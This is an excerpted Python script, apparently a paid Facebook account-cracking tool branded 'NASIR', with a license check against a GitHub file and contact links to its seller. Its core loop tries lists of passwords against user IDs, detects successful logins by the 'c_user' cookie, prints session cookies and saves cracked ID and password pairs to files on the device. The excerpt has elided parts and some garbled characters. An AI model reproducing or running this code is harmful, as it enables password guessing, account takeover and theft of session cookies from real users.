...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By Nasir")
...
def menu_apikey():
  ...
  id = "→".join(uuid)
  server = requests.get('https://github.com/nasirvau0/NASIR.py/blob/main/Aproval.txt').text
...
\033[38;5;46m║\033[38;5;46m║𝗣𝗥𝗢𝗚??𝗔𝗠𝗠𝗜𝗡𝗚║ ║  \033[38;5;46m║\033[38;5;46m║𝗔𝗨𝗧𝗛𝗢𝗥║\033[38;5;46m║𝗡𝗔𝗦𝗜𝗥 ║          ║      
\033[38;5;46m║\033[38;5;46m╚═══════════╝ ║  \033[38;5;46m║\033[38;5;46m╚══════╝\033[38;5;46m╚══════╝          ║
\033[38;5;46m║\033[38;5;46m╔══════╗      ║  \033[38;5;46m║\033[38;5;46m╔══════╗\033[38;5;46m╔════════════╗    ║
...
\033[38;5;46m╚══════════════╝  \033[38;5;46m╚══════════════════════════╝\033[00m\033[1;30m""")
  play_music('12.mp3')   
  print(f"\t \033[1;32m ADMIN BY NASIR VAU  \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Best Paid Tools Of NASIR VAU   \033[1;37m ")
  print(f"")
  print(f"\t \033[1;32m  Whatsapps Number +8801783751735\033[1;37m ")
  print(f"")
  ...
  os.system(f'xdg-open https://www.facebook.com/100014673737868')
  print(f"");time.sleep(2)
  print(f"\x1b[0;34m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/nasirvau0/PAID/blob/main/PAID.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+8801783751735?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801783751735');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/100014673737868');time.sleep(1)
		admin()
	if bal =='3':
		os.system('https://youtube.com/@CYBER-99-TEAM');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mNASIR\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [NASIR-OK] '+cid+' | '+ps+'\33[0;92m')
                ...
                open('/sdcard/NASIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\033[1;92m [💮] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/NASIR-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
